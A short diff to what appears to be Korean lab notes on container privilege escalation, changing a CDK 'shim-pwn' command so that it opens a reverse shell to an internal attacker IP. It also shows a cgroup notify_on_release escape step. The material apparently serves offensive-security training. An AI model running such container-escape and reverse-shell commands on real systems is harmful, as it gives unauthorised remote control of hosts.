@@ -1021,7 +1021,7 @@ echo 1 > /tmp/cgrp/x/notify_on_release
 
 # === 6. CDK (container privesc 통합 toolkit) ===
 ~/cdk/bin/cdk evaluate                                     # 모든 vector 자동
-~/cdk/bin/cdk run shim-pwn reverse 192.168.0.112 4444
+~/cdk/bin/cdk run shim-pwn reverse 10.20.30.202 4444   # 6v6-attacker 의 내부 IP
 ```
 
 ### 통합 자동 privesc chain (자체 stitcher)
